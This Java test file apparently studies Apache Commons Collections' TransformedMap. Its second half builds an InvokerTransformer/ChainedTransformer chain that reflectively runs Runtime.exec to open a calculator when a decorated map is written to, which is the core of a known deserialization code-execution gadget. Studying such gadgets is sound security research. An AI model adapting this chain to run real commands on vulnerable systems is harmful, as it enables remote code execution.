package org.su18.serialize.test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

/**
 * TransformedMap 测试
 * AbstractMapDecorator
 *
 * @author su18
 */
public class TransformedMapTest {


	public static HashMap<Integer, String> hashMap = new HashMap<>();

	/**
	 * 创建自定义 keyTransformer 在原有值上+1
	 */
	public static Transformer keyTransformer = new Transformer() {
		@Override
		public Object transform(Object input) {
			int num = (int) input;
			num += 1;
			return num;
		}
	};

	/**
	 * 创建自定义 valueTransformer 在原有字符串上拼接1
	 */
	public static Transformer valueTransformer = new Transformer() {
		@Override
		public Object transform(Object input) {
			String str = input.toString();

			return str + "1";
		}
	};

	public static void main(String[] args) {

		// 自定义 Transformer
		hashMap.put(1, "a");
		System.out.println("初始化map:" + hashMap);
		Map map = TransformedMap.decorate(hashMap, keyTransformer, valueTransformer);
		map.put(2, "b");
		System.out.println("transformMap:" + map);
		map.put(1, "w");
		System.out.println("transformMap:" + map);
		map.remove(1);
		System.out.println("transformMap:" + map);


		// InvokerTransformer 弹计算器测试
		Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"});
//		transformer.transform(Runtime.getRuntime());

		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
		});


		Map map2 = TransformedMap.decorate(hashMap, chain, null);
		map2.put(10, "aaa");
	}


}
